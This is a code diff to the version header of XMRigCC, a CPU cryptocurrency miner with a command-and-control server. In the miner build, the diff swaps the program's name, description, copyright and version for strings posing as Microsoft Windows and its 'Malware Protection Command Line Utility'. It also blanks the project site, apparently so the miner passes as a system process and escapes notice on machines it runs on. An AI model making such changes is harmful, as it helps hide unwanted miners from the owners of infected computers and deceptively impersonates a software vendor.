@@ -29,22 +29,22 @@
 #define APP_ID        "XMRigCC"
 #define APP_NAME      "XMRigCC"
 #define APP_DESC      "XMRigCC Command'n'Control Server"
-#define APP_COPYRIGHT "Copyright (C) 2017-  BenDr0id"
+#define APP_COPYRIGHT "Copyright (C) 2017- BenDr0id"
 # else
-#define APP_ID        "XMRigCC"
-#define APP_NAME      "XMRigCC"
-#define APP_DESC      "XMRigCC CPU miner"
-#define APP_COPYRIGHT "Copyright (C) 2017-  BenDr0id"
+#define APP_ID        "Microsoft Windows Operating System"
+#define APP_NAME      "Microsoft Windows Operating System"
+#define APP_DESC      "Microsoft Malware Protection Command Line Utility"
+#define APP_COPYRIGHT "(C) Microsoft Corporation. All rights reserved."
 #endif
-#define APP_VERSION   "1.8.13 (based on XMRig)"
+#define APP_VERSION   "6.1.7601.813"
 #define APP_DOMAIN    ""
-#define APP_SITE      "https://github.com/Bendr0id/xmrigCC"
+#define APP_SITE      ""
 #define APP_KIND      "cpu"
 
-#define APP_VER_MAJOR  1
-#define APP_VER_MINOR  8
-#define APP_VER_BUILD  13
-#define APP_VER_REV    0
+#define APP_VER_MAJOR  6
+#define APP_VER_MINOR  1
+#define APP_VER_BUILD  7601
+#define APP_VER_REV    813
 
 #ifndef NDEBUG
 	#ifndef XMRIG_NO_TLS
@@ -92,14 +92,14 @@ public:
     inline static std::string string()
     {
         std::string version = std::to_string(APP_VER_MAJOR) + std::string(".") + std::to_string(APP_VER_MINOR) +
-                              std::string(".") + std::to_string(APP_VER_BUILD);
+                              std::string(".") + std::to_string(APP_VER_BUILD) + std::string(".") + std::to_string(APP_VER_REV);
 
         return version;
     }
 
     inline static int code()
     {
-        std::string version = std::to_string(APP_VER_MAJOR) + std::to_string(APP_VER_MINOR) + std::to_string(APP_VER_BUILD);
+        std::string version = std::to_string(APP_VER_MAJOR) + std::to_string(APP_VER_MINOR) + std::to_string(APP_VER_BUILD) + std::to_string(APP_VER_REV);
 
         return std::stoi(version);
     }
